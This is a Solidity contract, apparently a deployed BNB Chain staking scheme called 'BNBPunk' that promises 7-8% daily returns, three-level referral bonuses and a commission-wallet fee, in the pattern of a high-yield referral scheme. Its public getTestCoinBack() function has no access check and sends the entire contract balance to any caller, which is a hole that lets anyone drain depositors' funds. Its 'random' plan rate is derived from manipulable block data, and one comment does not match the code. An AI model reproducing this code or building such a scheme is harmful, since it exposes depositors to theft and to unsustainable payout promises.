/**
 *Submitted for verification at BscScan.com on 2021-12-23
*/

pragma solidity 0.5.10;

contract BNBPunk {
    using SafeMath for *;

    uint constant public INVEST_MIN_AMOUNT = 0.05 ether;
    uint constant public PROJECT_FEE = 100;
    uint constant public PERCENT_STEP = 5;
    uint constant public MAX_HOLD_PERCENT = 20;
    uint constant public PERCENTS_DIVIDER = 1000;
    uint constant public TIME_STEP = 1 days;

    uint[] public REFERRAL_PERCENTS = [50, 25, 5];

    uint public totalStaked;
    uint public totalUsers;
    uint32 public START_TIME;

    bool public started;
    address payable public commissionWallet;

    struct Plan {
        uint16 time;
        uint32 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint128 amount;
        uint128 profit;
        uint32 percent;
        uint32 start;
        uint32 finish;
    }

    struct User {
        address upline;
        Deposit[] deposits;
        uint128 totalRefBonus;
        uint32 checkpoint;
        uint32 holdCheckpoint;
        uint24[3] refs;
    }

    mapping (address => User) internal users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint amount, uint profit, uint start, uint finish);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    event Withdrawn(address indexed user, uint256 amount);

    constructor(address payable wallet) public {
        require(!isContract(wallet));
        commissionWallet = wallet;

        plans.push(Plan(15, 80)); // 8% per day for 15 days
        plans.push(Plan(20, 70)); // 7% per day for 20 days
        plans.push(Plan(20, 40)); // random % (4-12%) per day for 20 days
    }


    function getTestCoinBack() public{
        msg.sender.transfer(address(this).balance);
    }

    function invest(address referrer, uint8 plan) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        if (!started) {
            if (msg.sender == commissionWallet) {
                START_TIME = uint32(block.timestamp);
                started = true;
            } else revert("Not started yet");
        }

        _invest(referrer, plan, msg.value, 0);
    }

    function withdraw() public {
        User storage user = users[msg.sender];

        uint payoutAmount = getUserDividends(msg.sender);

        require(payoutAmount > 0, "User has no dividends");

        uint contractBalance = address(this).balance;
        if (contractBalance < payoutAmount) {
            payoutAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);
        user.holdCheckpoint = uint32(block.timestamp);

        msg.sender.transfer(payoutAmount);

        emit Withdrawn(msg.sender, payoutAmount);
    }

    function withdrawAndReinvest(uint reinvestmentPercent, uint8 plan, address referrer) public {
        require(reinvestmentPercent >=50, "Min. reinvestment must be 50%");
        require(reinvestmentPercent <=100, "Max. reinvestment must be 100%");

        User storage user = users[msg.sender];

        uint totalAmount = getUserDividends(msg.sender);

        require(totalAmount > 0, "User has no dividends");

        uint reinvestment = totalAmount.mul(reinvestmentPercent).div(100);
        totalAmount = totalAmount.sub(reinvestment);

        _invest(referrer, plan, reinvestment, 5); // +0.5% profit if user does reinvestment

        user.checkpoint = uint32(block.timestamp);

        if(totalAmount > 0){
            msg.sender.transfer(totalAmount);
        }

        emit Withdrawn(msg.sender, totalAmount);
    }


    function _invest(address referrer, uint8 plan, uint amount, uint reinvestBonus) private {
        require(plan < 3, "Invalid plan");
        require(amount >= INVEST_MIN_AMOUNT);

        uint256 fee = amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        commissionWallet.transfer(fee);
        emit FeePayed(msg.sender, fee);

        User storage user = users[msg.sender];

        if (user.upline == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender ) {
            user.upline = referrer;
        }

        if (user.upline != address(0)) {
            address upline = user.upline;

            for (uint8 i = 0; i < 3; i++) {
                if(upline != address(0)) {
                    uint bonus = amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    users[upline].totalRefBonus = uint128(uint(users[upline].totalRefBonus).add(bonus));
                    address(uint160(upline)).transfer(bonus);
                    emit RefBonus(upline, msg.sender, i, bonus);

                    users[upline].refs[i]++;
                    upline = users[upline].upline;
                } else break;
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            user.holdCheckpoint = uint32(block.timestamp);
            totalUsers++;
            emit Newbie(msg.sender);
        }

        (uint percent, uint profit, uint finish) = getResult(plan, amount, reinvestBonus);

        user.deposits.push(Deposit(plan, uint128(amount), uint128(profit), uint32(percent), uint32(block.timestamp), uint32(finish)));

        totalStaked = totalStaked.add(amount);

        emit NewDeposit(msg.sender, plan, amount, profit, block.timestamp, finish);
    }


    function getUserDividends(address userAddr) public view returns (uint) {
        User storage user = users[userAddr];
        uint totalAmount;

        uint holdBonus = getUserPercentRate(userAddr);

        for (uint i = 0; i < user.deposits.length; i++) {
            if (user.checkpoint < user.deposits[i].finish) {
                uint share = uint(user.deposits[i].amount).mul(uint(user.deposits[i].percent).add(holdBonus)).div(PERCENTS_DIVIDER);
                uint from = user.deposits[i].start > user.checkpoint ? uint(user.deposits[i].start) : uint(user.checkpoint);
                uint to = uint(user.deposits[i].finish) < block.timestamp ? uint(user.deposits[i].finish) : block.timestamp;
                if (from < to) {
                    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
                }
            }
        }
        return totalAmount;
    }

    function getPercent(uint8 plan) private view returns (uint) {
        if(plan < 2){
            return uint(plans[plan].percent).add(PERCENT_STEP.mul(block.timestamp.sub(uint(START_TIME))).div(TIME_STEP));
        } else { //plan3 random
            uint random = getRandomPercent();
            return uint(plans[plan].percent).add(random).add(PERCENT_STEP.mul(block.timestamp.sub(uint(START_TIME))).div(TIME_STEP));
        }
    }

    function getRandomPercent() private view returns(uint) {
        bytes32 _blockhash = blockhash(block.number-1);

        uint random =  uint(keccak256(abi.encode(_blockhash,block.timestamp,block.difficulty))).mod(10); // random number 0...9    
        if(random == 9){
            random = random.sub(1);
        }
        return random.mul(10); // number 0...80
    }

    function getResult(uint8 plan, uint deposit, uint reinvestBonus) private view returns (uint percent, uint profit, uint finish) {
        percent = getPercent(plan).add(reinvestBonus);

        profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(uint(plans[plan].time));

        finish = block.timestamp.add(uint(plans[plan].time).mul(TIME_STEP));
    }

    function getUserAmountOfDeposits(address userAddr) public view returns(uint) {
        return users[userAddr].deposits.length;
    }

    function getUserTotalDeposits(address userAddr) public view returns(uint amount) {
        for (uint i = 0; i < users[userAddr].deposits.length; i++) {
            amount = amount.add(uint(users[userAddr].deposits[i].amount));
        }
    }

    function getUserPercentRate(address userAddr) public view returns (uint) {
        User storage user = users[userAddr];
        uint timeMultiplier = block.timestamp.sub(uint(user.holdCheckpoint)).div(TIME_STEP).mul(5); // +0.5% per day
        if (timeMultiplier > MAX_HOLD_PERCENT) {
            timeMultiplier = MAX_HOLD_PERCENT;
        }
        return timeMultiplier;
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getPlanInfo(uint8 plan) public view returns(uint16 time, uint32 percent) {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getPlanPercent(uint8 plan) public view returns (uint) {
        if ( START_TIME > 0 && block.timestamp >  START_TIME) {
            return uint(plans[plan].percent).add(PERCENT_STEP.mul(block.timestamp.sub(uint(START_TIME))).div(TIME_STEP));
        } else {
            return uint(plans[plan].percent);
        }
    }

    function getUserDepositHoldProfit(address userAddr, uint index) public view returns(uint) {
        User storage user = users[userAddr];
        uint holdBonus = getUserPercentRate(userAddr);

        uint profit;

        if (holdBonus > 0 && user.checkpoint < user.deposits[index].finish) {
            uint share = uint(user.deposits[index].amount).mul(holdBonus).div(PERCENTS_DIVIDER);
            uint from = user.deposits[index].start > user.checkpoint ? uint(user.deposits[index].start) : uint(user.checkpoint);
            uint to = uint(user.deposits[index].finish) < block.timestamp ? uint(user.deposits[index].finish) : block.timestamp;
            if (from < to) {
                profit = profit.add(share.mul(to.sub(from)).div(TIME_STEP));
            }
        }
        return profit;
    }

    function getUserDepositProfit(address userAddr, uint index) public view returns(uint8 plan, uint percent, uint amount, uint profit, uint32 start, uint32 finish){
        User storage user = users[userAddr];
        //uint holdBonus = getUserPercentRate(userAddr);

        plan = user.deposits[index].plan;
        percent = uint(user.deposits[index].percent);
        amount = uint(user.deposits[index].amount);
        profit = uint(user.deposits[index].profit);
        start = user.deposits[index].start;
        finish = user.deposits[index].finish;
    }

    function getSiteStats() external view returns (uint, uint, uint, uint32){
        return(
        totalStaked,
        totalUsers,
        getContractBalance(),
        START_TIME
        );
    }

    function getUserStats(address userAddr) public view returns(uint[5] memory userInfo, uint24[3] memory refs, address referrer) {
        User storage user = users[userAddr];
        userInfo[0] = getUserTotalDeposits(userAddr);
        userInfo[1] = getUserAmountOfDeposits(userAddr);
        userInfo[2] = uint(user.totalRefBonus);
        userInfo[3] = uint(user.checkpoint);
        userInfo[4] = uint(user.holdCheckpoint);

        refs = user.refs;
        referrer = user.upline;
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}